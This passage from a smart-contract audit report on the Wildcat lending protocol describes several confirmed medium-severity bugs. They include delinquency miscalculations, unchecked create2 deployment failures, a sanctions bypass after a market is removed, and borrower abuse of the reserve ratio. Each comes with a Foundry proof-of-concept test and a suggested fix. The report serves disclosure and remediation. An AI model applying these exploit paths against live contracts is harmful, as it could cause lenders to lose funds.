            maximumWithdrawalBatchDuration: MaximumWithdrawalBatchDuration,
            minimumAnnualInterestBips: MinimumAnnualInterestBips,
            maximumAnnualInterestBips: MaximumAnnualInterestBips
        });
        WildcatMarketControllerFactory controllerFactory = new WildcatMarketControllerFactory(
            address(archController),
            address(0),
            constraints
        );

        // Set protocol fee to 10%
        controllerFactory.setProtocolFeeConfiguration(
            address(1),
            address(0),
            0, 
            1000 // protocolFeeBips
        );

        // Register controllerFactory in archController
        archController.registerControllerFactory(address(controllerFactory));

        // Setup users
        AIKEN = makeAddr("AIKEN");
        DUEET = makeAddr("DUEET");
        asset.mint(AIKEN, 1000e18);
        asset.mint(DUEET, 1000e18);
        
        // Deploy controller and market for Aiken
        archController.registerBorrower(AIKEN);
        vm.prank(AIKEN);
        (address _controller, address _market) = controllerFactory.deployControllerAndMarket(
            "Market Token",
            "MKT",
            address(asset),
            type(uint128).max,
            50, // annual interest rate = 5%
            300, // delinquency fee = 30%
            3 weeks,
            300, // reserve ratio = 30%
            MaximumDelinquencyGracePeriod
        );
        controller = WildcatMarketController(_controller);
        market = WildcatMarket(_market);

        // Register Dueet as lender
        address[] memory arr = new address[](1);
        arr[0] = DUEET;
        vm.prank(AIKEN);
        controller.authorizeLenders(arr);
    }

    function test_queueWithdrawalRoundingAffectsDelinquency() public {
        // Dueet deposits 1000e18 tokens
        vm.startPrank(DUEET);
        asset.approve(address(market), 1000e18);
        market.depositUpTo(1000e18);
        vm.stopPrank();

        // Aiken borrows all assets
        uint256 amount = market.borrowableAssets();
        vm.prank(AIKEN);
        market.borrow(amount);

        // 1 day and 1 second passes
        skip(1 days + 1);

        // Aiken transfers assets so that market won't be delinquent even after full withdrawal
        amount = market.currentState().totalDebts() - market.totalAssets();
        vm.prank(AIKEN);
        asset.transfer(address(market), amount);

        // Collect fees
        market.collectFees();

        // Save snapshot before withdrawals
        uint256 snapshot = vm.snapshot();

        // Market won't be delinquent if Dueet withdraws all tokens at once
        amount = market.balanceOf(DUEET);
        vm.prank(DUEET);
        market.queueWithdrawal(amount);
        assertFalse(market.currentState().isDelinquent);

        // Revert state to before withdrawals
        vm.revertTo(snapshot);

        // Dueet withdraws 710992167266111033190 tokens
        vm.prank(DUEET);
        market.queueWithdrawal(710992167266111033190);

        // Dueet withdraws the rest of his tokens
        amount = market.balanceOf(DUEET);
        vm.prank(DUEET);
        market.queueWithdrawal(amount);

        // Market is now delinquent although same amount of tokens was withdrawn
        assertTrue(market.currentState().isDelinquent);
    }

    function test_marketCanBecomeDelinquentAfterClosing() public {
        // Dueet deposits 1000e18 tokens
        vm.startPrank(DUEET);
        asset.approve(address(market), 1000e18);
        market.depositUpTo(1000e18);
        vm.stopPrank();

        // Aiken borrows all assets
        uint256 amount = market.borrowableAssets();
        vm.prank(AIKEN);
        market.borrow(amount);

        // 1 day and 1 second passes
        skip(1 days + 1);

        // Aiken closes the market
        amount = market.currentState().totalDebts();
        vm.prank(AIKEN);
        asset.approve(address(market), amount);
        vm.prank(address(controller));
        market.closeMarket();

        // Collect fees
        market.collectFees();

        // Dueet withdraws 710992167266111033190 tokens
        vm.prank(DUEET);
        market.queueWithdrawal(710992167266111033190);

        // Dueet withdraws the rest of his tokens
        amount = market.balanceOf(DUEET);
        vm.prank(DUEET);
        market.queueWithdrawal(amount);

        // Market is now delinquent, even though it has been closed
        assertTrue(market.currentState().isDelinquent);
    }
}
```
</details>

### Recommended Mitigation

In `_applyWithdrawalBatchPayment()`, consider rounding down when calculating the amount of assets allocated to a batch:

[WildcatMarketBase.sol#L510-L511](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketBase.sol#L510-L511)

```diff
    uint104 scaledAmountBurned = uint104(MathUtils.min(scaledAvailableLiquidity, scaledAmountOwed));
-   uint128 normalizedAmountPaid = state.normalizeAmount(scaledAmountBurned).toUint128();
+   uint128 normalizedAmountPaid = MathUtils.mulDiv(scaledAmountBurned, state.scaleFactor, MathUtils.RAY).toUint128();
```

### Assessed type

Math

**[d1ll0n (Wildcat) confirmed](https://github.com/code-423n4/2023-10-wildcat-findings/issues/501#issuecomment-1796396893)**

***

## [[M-05] `collectFees()` updates delinquency wrongly as `_writeState()` is called before assets are transferred ](https://github.com/code-423n4/2023-10-wildcat-findings/issues/500)
*Submitted by [MiloTruck](https://github.com/code-423n4/2023-10-wildcat-findings/issues/500), also found by [deth](https://github.com/code-423n4/2023-10-wildcat-findings/issues/308), yumsec ([1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/131), [2](https://github.com/code-423n4/2023-10-wildcat-findings/issues/130)), [deepkin](https://github.com/code-423n4/2023-10-wildcat-findings/issues/117), and [T1MOH](https://github.com/code-423n4/2023-10-wildcat-findings/issues/36)*

The `collectFees()` function calls `_writeState()` before transferring assets to the `feeRecipient`:

[WildcatMarket.sol#L106-L107](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarket.sol#L106-L107)

```solidity
    _writeState(state);
    asset.safeTransfer(feeRecipient, withdrawableFees);
```

However, `_writeState()` calls `totalAssets()` when checking if the market is delinquent:

[WildcatMarketBase.sol#L448-L453](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketBase.sol#L448-L453)

```solidity
  function _writeState(MarketState memory state) internal {
    bool isDelinquent = state.liquidityRequired() > totalAssets();
    state.isDelinquent = isDelinquent;
    _state = state;
    emit StateUpdated(state.scaleFactor, isDelinquent);
  }
```

`totalAssets()` returns the current asset balance of the market:

[WildcatMarketBase.sol#L238-L240](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketBase.sol#L238-L240)

```solidity
  function totalAssets() public view returns (uint256) {
    return IERC20(asset).balanceOf(address(this));
  }
```

Since the transfer of assets is only performed *after* `_writeState()` is called, `totalAssets()` will be higher than it should be in `_writeState()`. This could cause `collectFees()` to incorrectly update `state.isDelinquent` to `false` when the market is still delinquent.

For example:

- Assume a market has the following state:
   - `liquidityRequired() = 1050`.
  - `totalAssets() = 1000`.
  - `state.accruedProtocolFees = 50`.
- The market's borrower calls `collectFees()`. In `_writeState()`:
  - `liquidityRequired() = 1050 - 50 = 1000`.
  - `totalAssets() = 1000` since the transfer of assets has not occurred.
  - As `liquidityRequired() == totalAssets()`, `isDelinquent` is updated to `false`.
  - However, the market is actually still delinquent as `totalAssets()` will be `950` after the call to `collectFees()`.

### Impact

`collectFees()` will incorrectly update the market to non-delinquent when `liquidityRequired() < totalAssets() + state.accuredProtocolFees`.

Should this occur, the [delinquency fee](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/libraries/FeeMath.sol#L159-L169) will not be added to `scaleFactor` until the market's state is updated later on, causing a loss of yield for lenders since the borrower gets to avoid paying the penalty fee for a period of time.

### Proof of Concept

The following test demonstrates how `collectFees()` incorrectly updates `state.isDelinquent` to `false` when the market is still delinquent:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.20;

import 'src/WildcatArchController.sol';
import 'src/WildcatMarketControllerFactory.sol';

import 'forge-std/Test.sol';
import 'test/shared/TestConstants.sol';
import 'test/helpers/MockERC20.sol';

contract CollectFeesTest is Test {
    // Wildcat contracts
    WildcatMarketController controller;
    WildcatMarket market;
    
    // Test contracts
    MockERC20 asset = new MockERC20();

    // Users
    address AIKEN;
    address DUEET;

    function setUp() external {
        // Deploy Wildcat contracts
        WildcatArchController archController = new WildcatArchController();
        MarketParameterConstraints memory constraints = MarketParameterConstraints({
            minimumDelinquencyGracePeriod: MinimumDelinquencyGracePeriod,
            maximumDelinquencyGracePeriod: MaximumDelinquencyGracePeriod,
            minimumReserveRatioBips: MinimumReserveRatioBips,
            maximumReserveRatioBips: MaximumReserveRatioBips,
            minimumDelinquencyFeeBips: MinimumDelinquencyFeeBips,
            maximumDelinquencyFeeBips: MaximumDelinquencyFeeBips,
            minimumWithdrawalBatchDuration: MinimumWithdrawalBatchDuration,
            maximumWithdrawalBatchDuration: MaximumWithdrawalBatchDuration,
            minimumAnnualInterestBips: MinimumAnnualInterestBips,
            maximumAnnualInterestBips: MaximumAnnualInterestBips
        });
        WildcatMarketControllerFactory controllerFactory = new WildcatMarketControllerFactory(
            address(archController),
            address(0),
            constraints
        );

        // Set protocol fee to 10%
        controllerFactory.setProtocolFeeConfiguration(
            address(1),
            address(0),
            0, 
            1000 // protocolFeeBips
        );

        // Register controllerFactory in archController
        archController.registerControllerFactory(address(controllerFactory));

        // Setup Aiken and register him as borrower
        AIKEN = makeAddr("AIKEN");
        archController.registerBorrower(AIKEN);
        asset.mint(AIKEN, 1000e18);

        // Setup Dueet and give him some asset token
        DUEET = makeAddr("DUEET");
        asset.mint(DUEET, 1000e18);
        
        // Deploy controller and market for Aiken
        vm.prank(AIKEN);
        (address _controller, address _market) = controllerFactory.deployControllerAndMarket(
            "Market Token",
            "MKT",
            address(asset),
            type(uint128).max,
            MaximumAnnualInterestBips,
            MaximumDelinquencyFeeBips,
            MaximumWithdrawalBatchDuration,
            MaximumReserveRatioBips,
            MaximumDelinquencyGracePeriod
        );
        controller = WildcatMarketController(_controller);
        market = WildcatMarket(_market);
    }

    function test_collectFeesUpdatesDelinquencyWrongly() public {
        // Register Dueet as lender
        address[] memory arr = new address[](1);
        arr[0] = DUEET;
        vm.prank(AIKEN);
        controller.authorizeLenders(arr);

        // Dueet becomes a lender in the market
        vm.startPrank(DUEET);
        asset.approve(address(market), 1000e18);
        market.depositUpTo(1000e18);
        vm.stopPrank();

        // Some time passes, market becomes delinquent
        skip(2 weeks);
        market.updateState();
        MarketState memory state = market.previousState();
        assertTrue(state.isDelinquent);

        // Aiken tops up some assets
        uint256 amount = market.coverageLiquidity() -  market.totalAssets() - market.accruedProtocolFees();
        vm.prank(AIKEN);
        asset.transfer(address(market), amount);
        
        // Someone calls collectFees()
        market.collectFees();

        // Market was updated to not delinquent
        state = market.previousState();
        assertFalse(state.isDelinquent);

        // However, it should be delinquent as liquidityRequired > totalAssets()
        assertGt(market.coverageLiquidity(), market.totalAssets());
    }
}
```

### Recommended Mitigation

In `collectFees()`, consider calling `_writeState()` after assets have been transferred to the `feeRecipient`:

[WildcatMarket.sol#L106-L107](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarket.sol#L106-L107)

```diff
-   _writeState(state);
    asset.safeTransfer(feeRecipient, withdrawableFees);
+   _writeState(state);
```

**[laurenceday (Wildcat) confirmed and commented](https://github.com/code-423n4/2023-10-wildcat-findings/issues/500#issuecomment-1810769823):**
 > Mitigated [here](https://github.com/wildcat-finance/wildcat-protocol/commit/016f6f2d43fa33cebe15c422f8663c76a4e4fd10).

*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-wildcat-findings/issues/500).*

***

## [[M-06] `create2WithStoredInitCode()` does not revert if contract deployment failed](https://github.com/code-423n4/2023-10-wildcat-findings/issues/499)
*Submitted by [MiloTruck](https://github.com/code-423n4/2023-10-wildcat-findings/issues/499), also found by [nonseodion](https://github.com/code-423n4/2023-10-wildcat-findings/issues/686), [Robert](https://github.com/code-423n4/2023-10-wildcat-findings/issues/655), [LokiThe5th](https://github.com/code-423n4/2023-10-wildcat-findings/issues/432), [0xCiphky](https://github.com/code-423n4/2023-10-wildcat-findings/issues/403), [Madalad](https://github.com/code-423n4/2023-10-wildcat-findings/issues/319), and [ZdravkoHr](https://github.com/code-423n4/2023-10-wildcat-findings/issues/28)*

In `LibStoredInitCode.sol`, the `create2WithStoredInitCode()` function, which is used to deploy contracts with the `CREATE2` opcode, is as shown:

[LibStoredInitCode.sol#L106-L117](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/libraries/LibStoredInitCode.sol#L106-L117)

```solidity
  function create2WithStoredInitCode(
    address initCodeStorage,
    bytes32 salt,
    uint256 value
  ) internal returns (address deployment) {
    assembly {
      let initCodePointer := mload(0x40)
      let initCodeSize := sub(extcodesize(initCodeStorage), 1)
      extcodecopy(initCodeStorage, initCodePointer, 1, initCodeSize)
      deployment := create2(value, initCodePointer, initCodeSize, salt)
    }
  }
```

The `create2` opcode returns `address(0)` if contract deployment reverted. However, as seen from above,  `create2WithStoredInitCode()` does not check if the `deployment` address is `address(0)`.

This is an issue as `deployMarket()` will not revert when deployment of the `WildcatMarket` contract fails:

[WildcatMarketController.sol#L354-L357](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L354-L357)

```solidity
    LibStoredInitCode.create2WithStoredInitCode(marketInitCodeStorage, salt);

    archController.registerMarket(market);
    _controlledMarkets.add(market);
```

Therefore, if the origination fee is enabled for the protocol, users that call `deployMarket()` will pay the origination fee even if the market was not deployed.

Additionally, the `market` address will be registered in the `WildcatArchController` contract and added to `_addControlledMarkets`. This will cause both sets to become inaccurate if deployment failed as `market` would be an address that has no code.

This also leads to more problems if a user attempts to call `deployMarket()` with the same `asset`, `namePrefix` and `symbolPrefix`. Since the `market` address has already been registered, `registerMarket()` will revert when called for a second time:

[WildcatArchController.sol#L192-L195](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatArchController.sol#L192-L195)

```solidity
  function registerMarket(address market) external onlyController {
    if (!_markets.add(market)) {
      revert MarketAlreadyExists();
    }
```

As such, if a user calls `deployMarket()` and market deployment fails, they cannot call `deployMarket()` with the same set of parameters ever again.

Note that it is possible for market deployment to fail, as seen in the constructor of `WildcatMarketBase`:

[WildcatMarketBase.sol#L79-L99](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketBase.sol#L79-L99)

```solidity
    if ((parameters.protocolFeeBips > 0).and(parameters.feeRecipient == address(0))) {
      revert FeeSetWithoutRecipient();
    }
    if (parameters.annualInterestBips > BIP) {
      revert InterestRateTooHigh();
    }
    if (parameters.reserveRatioBips > BIP) {
      revert ReserveRatioBipsTooHigh();
    }
    if (parameters.protocolFeeBips > BIP) {
      revert InterestFeeTooHigh();
    }
    if (parameters.delinquencyFeeBips > BIP) {
      revert PenaltyFeeTooHigh();
    }

    // Set asset metadata
    asset = parameters.asset;
    name = string.concat(parameters.namePrefix, queryName(parameters.asset));
    symbol = string.concat(parameters.symbolPrefix, querySymbol(parameters.asset));
    decimals = IERC20Metadata(parameters.asset).decimals();
```

For example, the protocol could have configured `protocolFeeBips` or `feeRecipient` incorrectly. Alternatively, `asset` could be an invalid address, or an ERC20 token that does not have the `name()`, `symbol()` or `decimal()` function.

### Impact

Since `deployMarket()` does not revert when creation of the `WildcatMarket` contract fails, users will pay the origination fee for failed deployments, causing a loss of funds.

Additionally, `deployMarket()` will not be callable for the same `asset`, `namePrefix` and `symbolPrefix`, thus a user can never deploy a market with these parameters.

### Proof of Concept

The following test demonstrates how `deployMarket()` does not revert even if deployment of the `WildcatMarket` contract failed, and how it reverts when attempting to deploy the same market with valid parameters afterward:

<details>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.20;

import 'src/WildcatArchController.sol';
import 'src/WildcatMarketControllerFactory.sol';

import 'forge-std/Test.sol';
import 'test/shared/TestConstants.sol';
import 'test/helpers/MockERC20.sol';

contract MarketDeploymentRevertTest is Test {
    // Wildcat contracts
    WildcatArchController archController;
    WildcatMarketControllerFactory controllerFactory;
    WildcatMarketController controller;
    
    // Test contracts
    MockERC20 originationFeeAsset = new MockERC20();
    MockERC20 marketAsset = new MockERC20();

    // Users
    address BORROWER;

    function setUp() external {
        // Deploy Wildcat contracts
        archController = new WildcatArchController();
        MarketParameterConstraints memory constraints = MarketParameterConstraints({
            minimumDelinquencyGracePeriod: MinimumDelinquencyGracePeriod,
            maximumDelinquencyGracePeriod: MaximumDelinquencyGracePeriod,
            minimumReserveRatioBips: MinimumReserveRatioBips,
            maximumReserveRatioBips: MaximumReserveRatioBips,
            minimumDelinquencyFeeBips: MinimumDelinquencyFeeBips,
            maximumDelinquencyFeeBips: MaximumDelinquencyFeeBips,
            minimumWithdrawalBatchDuration: MinimumWithdrawalBatchDuration,
            maximumWithdrawalBatchDuration: MaximumWithdrawalBatchDuration,
            minimumAnnualInterestBips: MinimumAnnualInterestBips,
            maximumAnnualInterestBips: MaximumAnnualInterestBips
        });
        controllerFactory = new WildcatMarketControllerFactory(
            address(archController),
            address(0),
            constraints
        );

        // Register controllerFactory in archController
        archController.registerControllerFactory(address(controllerFactory));

        // Setup borrower
        BORROWER = makeAddr("BORROWER");
        originationFeeAsset.mint(BORROWER, 10e18);
        archController.registerBorrower(BORROWER);

        // Deploy controller
        vm.prank(BORROWER);
        controller = WildcatMarketController(controllerFactory.deployController());
    }

    function test_marketDeploymentDoesntRevert() public {
        // Set protocol fee to larger than BIP
        controllerFactory.setProtocolFeeConfiguration(
            address(1),
            address(originationFeeAsset),
            5e18, // originationFeeAmount,
            1e4 + 1 // protocolFeeBips
        );

        string memory namePrefix = "Market ";
        string memory symbolPrefix = "MKT-";

        // deployMarket() does not revert
        vm.startPrank(BORROWER);
        originationFeeAsset.approve(address(controller), 5e18);
        address market = controller.deployMarket(
            address(marketAsset),
            namePrefix,
            symbolPrefix,
            type(uint128).max,
            MaximumAnnualInterestBips,
            MaximumDelinquencyFeeBips,
            MaximumWithdrawalBatchDuration,
            MaximumReserveRatioBips,
            MaximumDelinquencyGracePeriod
        );
        vm.stopPrank();

        // However, the market was never deployed and borrower paid the origination fee
        assertEq(market.code.length, 0);
        assertEq(originationFeeAsset.balanceOf(BORROWER), 5e18);

        // Set protocol fee to valid value
        controllerFactory.setProtocolFeeConfiguration(
            address(1),
            address(originationFeeAsset),
            5e18, // originationFeeAmount,
            0 // protocolFeeBips
        );

        // Call deployMarket() with valid parameters reverts as market address is already registered
        vm.startPrank(BORROWER);
        originationFeeAsset.approve(address(controller), 5e18);
        vm.expectRevert(WildcatArchController.MarketAlreadyExists.selector);
        market = controller.deployMarket(
            address(marketAsset),
            namePrefix,
            symbolPrefix,
            type(uint128).max,
            MaximumAnnualInterestBips,
            MaximumDelinquencyFeeBips,
            MaximumWithdrawalBatchDuration,
            MaximumReserveRatioBips,
            MaximumDelinquencyGracePeriod
        );
        vm.stopPrank();
    }
}
```

</details>

### Recommended Mitigation

In `create2WithStoredInitCode()`, consider checking if the `deployment` address is `address(0)`, and reverting if so:

[LibStoredInitCode.sol#L106-L117](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/libraries/LibStoredInitCode.sol#L106-L117)

```diff
  function create2WithStoredInitCode(
    address initCodeStorage,
    bytes32 salt,
    uint256 value
  ) internal returns (address deployment) {
    assembly {
      let initCodePointer := mload(0x40)
      let initCodeSize := sub(extcodesize(initCodeStorage), 1)
      extcodecopy(initCodeStorage, initCodePointer, 1, initCodeSize)
      deployment := create2(value, initCodePointer, initCodeSize, salt)
+     if iszero(deployment) {
+         mstore(0x00, 0x30116425) // DeploymentFailed()
+         revert(0x1c, 0x04)
+     }
    }
  }
```

### Assessed type

Library

**[laurenceday (Wildcat) commented](https://github.com/code-423n4/2023-10-wildcat-findings/issues/499#issuecomment-1803389819):**
 > Mitigated [here](https://github.com/wildcat-finance/wildcat-protocol/commit/e93bcd9625e3e51d4689fdb0d45c58e7d57929d7).

**[laurenceday (Wildcat) confirmed](https://github.com/code-423n4/2023-10-wildcat-findings/issues/499#issuecomment-1810766041)**

***

## [[M-07] Removing markets from `WildcatArchController` gives lenders immunity from sanctions](https://github.com/code-423n4/2023-10-wildcat-findings/issues/498)
*Submitted by [MiloTruck](https://github.com/code-423n4/2023-10-wildcat-findings/issues/498), also found by [josephdara](https://github.com/code-423n4/2023-10-wildcat-findings/issues/633)*

In `WildcatSanctionsSentinel.sol`, the `createEscrow()` function checks that `msg.sender` is a registered market in the `WildcatArchController` contract:

[WildcatSanctionsSentinel.sol#L95-L102](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L95-L102)

```solidity
  function createEscrow(
    address borrower,
    address account,
    address asset
  ) public override returns (address escrowContract) {
    if (!IWildcatArchController(archController).isRegisteredMarket(msg.sender)) {
      revert NotRegisteredMarket();
    }
```

This is meant to ensure that `createEscrow()` can only be called by markets deployed by the protocol, since they are registered using [`registerMarket()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatArchController.sol#L192-L197).

However, such an implementation does not account for markets that are removed using the [`removeMarket()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatArchController.sol#L199-L204) function.

If a market is removed, it should still be able to operate normally as a registered market would. However, due to the check shown above, any function that calls `createEscrow()` will always revert for removed markets, namely [`nukeFromOrbit()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketConfig.sol#L74-L81) and [`executeWithdrawal()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketWithdrawals.sol#L123-L188) when they are called for sanctioned lenders.

### Impact

If a market is removed, lenders that are sanctioned on Chainalysis cannot be blocked using `nukeFromOrbit()` since the function will always revert.

This is problematic, as sanctioned addresses will still be able to interact with the market in various ways, such as [transferring market tokens](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketToken.sol#L64-L82), [making deposits](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarket.sol#L31-L77) or calling [`queueWithdrawal()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketWithdrawals.sol#L74-L121), when they should not be able to.

Sanctioned lenders will also be unable to call `executeWithdrawal()` to withdraw their assets from the market into their own escrows.

### Proof of Concept

The following test demonstrates how `nukeFromOrbit()` and `executeWithdrawal()` will revert for sanctioned lenders when a market is removed from the `WildcatArchController` contract:

<details>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.20;

import 'src/WildcatSanctionsSentinel.sol';
import 'src/WildcatArchController.sol';
import 'src/WildcatMarketControllerFactory.sol';
import 'src/interfaces/IWildcatSanctionsSentinel.sol';

import 'forge-std/Test.sol';
import 'test/shared/TestConstants.sol';
import 'test/helpers/MockERC20.sol';

contract CreateEscrowTest is Test {
    // Wildcat contracts
    WildcatSanctionsSentinel sentinel;
    WildcatArchController archController;
    WildcatMarketControllerFactory controllerFactory;
    WildcatMarketController controller;
    WildcatMarket market;
    
    // Test contracts
    MockChainalysis chainalysis = new MockChainalysis();
    MockERC20 asset = new MockERC20();

    // Users
    address AIKEN;
    address DUEET;

    function setUp() external {
        // Deploy Wildcat contracts
        archController = new WildcatArchController();
        sentinel = new WildcatSanctionsSentinel(address(archController), address(chainalysis));
        MarketParameterConstraints memory constraints = MarketParameterConstraints({
            minimumDelinquencyGracePeriod: MinimumDelinquencyGracePeriod,
            maximumDelinquencyGracePeriod: MaximumDelinquencyGracePeriod,
            minimumReserveRatioBips: MinimumReserveRatioBips,
            maximumReserveRatioBips: MaximumReserveRatioBips,
            minimumDelinquencyFeeBips: MinimumDelinquencyFeeBips,
            maximumDelinquencyFeeBips: MaximumDelinquencyFeeBips,
            minimumWithdrawalBatchDuration: MinimumWithdrawalBatchDuration,
            maximumWithdrawalBatchDuration: MaximumWithdrawalBatchDuration,
            minimumAnnualInterestBips: MinimumAnnualInterestBips,
            maximumAnnualInterestBips: MaximumAnnualInterestBips
        });
        controllerFactory = new WildcatMarketControllerFactory(
            address(archController),
            address(sentinel),
            constraints
        );

        // Register controllerFactory in archController
        archController.registerControllerFactory(address(controllerFactory));

        // Setup Aiken and register him as borrower
        AIKEN = makeAddr("AIKEN");
        archController.registerBorrower(AIKEN);

        // Setup Dueet and give him some asset token
        DUEET = makeAddr("DUEET");
        asset.mint(DUEET, 1000e18);

        // Deploy controller and market for Aiken
        vm.prank(AIKEN);
        (address _controller, address _market) = controllerFactory.deployControllerAndMarket(
            "Market Token",
            "MKT",
            address(asset),
            type(uint128).max,
            MaximumAnnualInterestBips,
            MaximumDelinquencyFeeBips,
            MaximumWithdrawalBatchDuration,
            MaximumReserveRatioBips,
            MaximumDelinquencyGracePeriod
        );
        controller = WildcatMarketController(_controller);
        market = WildcatMarket(_market);
    }

    function test_removingMarketDOSCreateEscrow() public {
        // Register Dueet as lender
        address[] memory arr = new address[](1);
        arr[0] = DUEET;
        vm.prank(AIKEN);
        controller.authorizeLenders(arr);

        // Dueet becomes a lender in the market
        vm.startPrank(DUEET);
        asset.approve(address(market), 1000e18);
        market.depositUpTo(1000e18);

        // Queue withdrawal for Dueet
        market.queueWithdrawal(500e18);
        vm.stopPrank();

        // Time passes until the withdrawal expires
        skip(MaximumWithdrawalBatchDuration);

        // Dueet becomes sanctioned
        chainalysis.sanction(DUEET);

        // Market get removes from archController
        archController.removeMarket(address(market));

        // nukeFromOrbit() reverts for Dueet
        vm.expectRevert(IWildcatSanctionsSentinel.NotRegisteredMarket.selector);
        market.nukeFromOrbit(DUEET);

        // executeWithdrawal() also reverts for Dueet
        vm.expectRevert(IWildcatSanctionsSentinel.NotRegisteredMarket.selector);
        market.executeWithdrawal(DUEET, uint32(block.timestamp));
    }
}

contract MockChainalysis {
    mapping(address => bool) public isSanctioned;

    function sanction(address addr) external {
        isSanctioned[addr] = true;
    }
}
```

</details>

### Recommended Mitigation

Consider implementing a way to track removed markets in `WildcatArchController`. For example, a new `EnumerableSet` named `_removedMarkets` could be added.

This can be used to allow removed markets to call `createEscrow()` as such:

[WildcatSanctionsSentinel.sol#L95-L102](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L95-L102)

```diff
  function createEscrow(
    address borrower,
    address account,
    address asset
  ) public override returns (address escrowContract) {
-   if (!IWildcatArchController(archController).isRegisteredMarket(msg.sender)) {
+   if (!IWildcatArchController(archController).isRegisteredMarket(msg.sender) && !IWildcatArchController(archController).isRemovedMarket(msg.sender)) {
      revert NotRegisteredMarket();
    }
```

### Assessed type

Invalid Validation

**[d1ll0n (Wildcat) confirmed](https://github.com/code-423n4/2023-10-wildcat-findings/issues/498#issuecomment-1788827614)**

**[laurenceday (Wildcat) commented](https://github.com/code-423n4/2023-10-wildcat-findings/issues/498#issuecomment-1803408475):**
 > Mitigated [here](https://github.com/wildcat-finance/wildcat-protocol/pull/57/commits/22c2eb6dae8fe2fe74e5c8e478cb755fbf6827f0). Removing the check altogether.

***

## [[M-08] `setAnnualInterestBips()` can be abused to keep a market's reserve ratio at 90%](https://github.com/code-423n4/2023-10-wildcat-findings/issues/497)
*Submitted by [MiloTruck](https://github.com/code-423n4/2023-10-wildcat-findings/issues/497), also found by [T1MOH](https://github.com/code-423n4/2023-10-wildcat-findings/issues/732), [elprofesor](https://github.com/code-423n4/2023-10-wildcat-findings/issues/674), [trachev](https://github.com/code-423n4/2023-10-wildcat-findings/issues/598), [t0x1c](https://github.com/code-423n4/2023-10-wildcat-findings/issues/572), [ast3ros](https://github.com/code-423n4/2023-10-wildcat-findings/issues/514), [joaovwfreire](https://github.com/code-423n4/2023-10-wildcat-findings/issues/383), [CaeraDenoir](https://github.com/code-423n4/2023-10-wildcat-findings/issues/234), and [rvierdiiev](https://github.com/code-423n4/2023-10-wildcat-findings/issues/75)*

If a borrower calls `setAnnualInterestBips()` to reduce a market's annual interest rate, its reserve ratio will be set to 90% for 2 weeks:

[WildcatMarketController.sol#L472-L485](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L472-L485)

```solidity
    // If borrower is reducing the interest rate, increase the reserve
    // ratio for the next two weeks.
    if (annualInterestBips < WildcatMarket(market).annualInterestBips()) {
      TemporaryReserveRatio storage tmp = temporaryExcessReserveRatio[market];

      if (tmp.expiry == 0) {
        tmp.reserveRatioBips = uint128(WildcatMarket(market).reserveRatioBips());

        // Require 90% liquidity coverage for the next 2 weeks
        WildcatMarket(market).setReserveRatioBips(9000);
      }

      tmp.expiry = uint128(block.timestamp + 2 weeks);
    }
```

This is meant to give lenders the option to withdraw from the market should they disagree with the decrease in annual interest rate.

However, such an implementation can be abused by a borrower in a market where the reserve ratio above 90%:

1. Borrower deploys a market with a reserve ratio at 95%.
2. A lender, who agrees to a 95% reserve ratio, deposits into the market.
3. Borrower calls `setAnnualInterestBips()` to reduce `annualInterestBips` by 1.
   - This causes the market's reserve ratio to be set to 90% for 2 weeks.
4. After 2 weeks, the borrower calls `setAnnualInterestBips()` and decreases `annualInterestBips` by 1 again.
5. By repeating steps 3 and 4, the borrower can effectively keep the market's reserve ratio at 90% forever.

In the scenario above, the 5% reduction in reserve ratio works in favor of the borrower since they do not have to keep as much assets in the market. The amount of assets that all lenders can withdraw at any given time will also be 5% less than what it should be.

Note that it is possible for a market to be deployed with a reserve ratio above 90% if the protocol's `MaximumReserveRatioBips` permits. For example, `MaximumReserveRatioBips` is set to 100% in current tests:

[TestConstants.sol#L21](https://github.com/code-423n4/2023-10-wildcat/blob/main/test/shared/TestConstants.sol#L21)

```solidity
uint16 constant MaximumReserveRatioBips = 10_000;
```

### Impact

In a market where the reserve ratio is above 90%, a borrower can repeatedly call `setAnnualInterestBips()` every two weeks to keep the reserve ratio at 90%.

This is problematic, as a market's reserve ratio is not meant to be adjustable post-deployment, since the borrower and their lenders must agree to a fixed reserve ratio beforehand.

### Recommended Mitigation

In `setAnnualInterestBips()`, consider setting the market's reserve ratio to 90% only if it is lower:

[WildcatMarketController.sol#L472-L485](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L472-L485)

```diff
    // If borrower is reducing the interest rate, increase the reserve
    // ratio for the next two weeks.
-   if (annualInterestBips < WildcatMarket(market).annualInterestBips()) {
+   if (annualInterestBips < WildcatMarket(market).annualInterestBips() && WildcatMarket(market).reserveRatioBips() < 9000) {
      TemporaryReserveRatio storage tmp = temporaryExcessReserveRatio[market];

      if (tmp.expiry == 0) {
        tmp.reserveRatioBips = uint128(WildcatMarket(market).reserveRatioBips());

        // Require 90% liquidity coverage for the next 2 weeks
        WildcatMarket(market).setReserveRatioBips(9000);
